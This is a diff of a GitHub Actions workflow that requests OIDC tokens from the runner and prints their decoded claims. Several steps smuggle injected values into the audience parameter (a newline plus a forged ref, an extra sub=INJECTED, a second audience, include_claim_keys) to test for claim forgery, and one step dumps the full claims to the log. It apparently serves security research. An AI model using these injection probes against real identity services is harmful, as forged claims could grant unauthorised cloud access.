@@ -15,88 +15,45 @@ jobs:
     steps:
       - name: Test 1 - Standard audience
         run: |
-          T=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
+          T=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
           P=$(echo "$T" | cut -d. -f2)
           echo "=== Test 1 Standard ==="
-          echo "$P" | python3 -c "
-import sys,base64,json; d=sys.stdin.read().strip()
-p=d+'='*(4-len(d)%4)
-c=json.loads(base64.urlsafe_b64decode(p))
-print('aud:', repr(c.get('aud')))
-print('sub:', c.get('sub'))"
+          echo "$P" | python3 -c "import sys,base64,json; d=sys.stdin.read().strip(); p=d+'='*(4-len(d)%4); c=json.loads(base64.urlsafe_b64decode(p)); print('aud:', repr(c.get('aud'))); print('sub:', c.get('sub'))"
 
       - name: Test 2 - Newline injection
         run: |
-          R=$(curl -sSf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com%0aref%3Arefs%2Fheads%2Fmain" 2>&1) || true
+          R=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com%0aref%3Arefs%2Fheads%2Fmain" 2>&1) || true
           echo "=== Test 2 Newline injection ==="
           T=$(echo "$R" | jq -r '.value // empty' 2>/dev/null || echo "")
           if [ -z "$T" ]; then echo "EMPTY RESPONSE: $R"; exit 0; fi
-          echo "$T" | cut -d. -f2 | python3 -c "
-import sys,base64,json; d=sys.stdin.read().strip()
-p=d+'='*(4-len(d)%4)
-try:
-  c=json.loads(base64.urlsafe_b64decode(p))
-  print('aud:', repr(c.get('aud')))
-except Exception as e:
-  print('Error:', e)"
+          echo "$T" | cut -d. -f2 | python3 -c "import sys,base64,json; d=sys.stdin.read().strip(); p=d+'='*(4-len(d)%4); c=json.loads(base64.urlsafe_b64decode(p)); print('aud:', repr(c.get('aud')))" 2>/dev/null || echo "PARSE ERROR"
 
       - name: Test 3 - Sub param injection
         run: |
-          R=$(curl -sSf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com&sub=INJECTED" 2>&1) || true
+          R=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com&sub=INJECTED" 2>&1) || true
           echo "=== Test 3 Sub param injection ==="
           T=$(echo "$R" | jq -r '.value // empty' 2>/dev/null || echo "")
           if [ -z "$T" ]; then echo "EMPTY RESPONSE: $R"; exit 0; fi
-          echo "$T" | cut -d. -f2 | python3 -c "
-import sys,base64,json; d=sys.stdin.read().strip()
-p=d+'='*(4-len(d)%4)
-try:
-  c=json.loads(base64.urlsafe_b64decode(p))
-  print('sub:', repr(c.get('sub')))
-except Exception as e:
-  print('Error:', e)"
+          echo "$T" | cut -d. -f2 | python3 -c "import sys,base64,json; d=sys.stdin.read().strip(); p=d+'='*(4-len(d)%4); c=json.loads(base64.urlsafe_b64decode(p)); print('sub:', repr(c.get('sub')))" 2>/dev/null || echo "PARSE ERROR"
 
-      - name: Test 4 - Comma-separated audiences
+      - name: Test 4 - Comma audiences
         run: |
-          R=$(curl -sSf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com%2Chttps%3A%2F%2Faccounts.google.com" 2>&1) || true
+          R=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com%2Chttps%3A%2F%2Faccounts.google.com" 2>&1) || true
           echo "=== Test 4 Comma audience ==="
           T=$(echo "$R" | jq -r '.value // empty' 2>/dev/null || echo "")
           if [ -z "$T" ]; then echo "EMPTY RESPONSE"; exit 0; fi
-          echo "$T" | cut -d. -f2 | python3 -c "
-import sys,base64,json; d=sys.stdin.read().strip()
-p=d+'='*(4-len(d)%4)
-try:
-  c=json.loads(base64.urlsafe_b64decode(p))
-  print('aud:', repr(c.get('aud')))
-except Exception as e:
-  print('Error:', e)"
+          echo "$T" | cut -d. -f2 | python3 -c "import sys,base64,json; d=sys.stdin.read().strip(); p=d+'='*(4-len(d)%4); c=json.loads(base64.urlsafe_b64decode(p)); print('aud:', repr(c.get('aud')))" 2>/dev/null || echo "PARSE ERROR"
 
-      - name: Test 5 - include_claim_keys bypass via custom audience
+      - name: Test 5 - include_claim_keys bypass
         run: |
-          echo "=== Test 5 Custom claim key audience ==="
-          R=$(curl -sSf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com%26include_claim_keys%3Drepo%2Cref" 2>&1) || true
+          echo "=== Test 5 Custom claim key in audience ==="
+          R=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com%26include_claim_keys%3Drepo%2Cref" 2>&1) || true
           T=$(echo "$R" | jq -r '.value // empty' 2>/dev/null || echo "")
           if [ -z "$T" ]; then echo "EMPTY RESPONSE: $R"; exit 0; fi
-          echo "$T" | cut -d. -f2 | python3 -c "
-import sys,base64,json; d=sys.stdin.read().strip()
-p=d+'='*(4-len(d)%4)
-try:
-  c=json.loads(base64.urlsafe_b64decode(p))
-  print('aud:', repr(c.get('aud')))
-  print('sub:', c.get('sub'))
-except Exception as e:
-  print('Error:', e)"
+          echo "$T" | cut -d. -f2 | python3 -c "import sys,base64,json; d=sys.stdin.read().strip(); p=d+'='*(4-len(d)%4); c=json.loads(base64.urlsafe_b64decode(p)); print('aud:', repr(c.get('aud'))); print('sub:', c.get('sub'))" 2>/dev/null || echo "PARSE ERROR"
 
       - name: Full token dump
         run: |
-          T=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
+          T=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
           echo "=== Full Token Claims ==="
-          echo "$T" | cut -d. -f2 | python3 -c "
-import sys,base64,json; d=sys.stdin.read().strip()
-p=d+'='*(4-len(d)%4)
-print(json.dumps(json.loads(base64.urlsafe_b64decode(p)),indent=2))"
+          echo "$T" | cut -d. -f2 | python3 -c "import sys,base64,json; d=sys.stdin.read().strip(); p=d+'='*(4-len(d)%4); print(json.dumps(json.loads(base64.urlsafe_b64decode(p)),indent=2))"
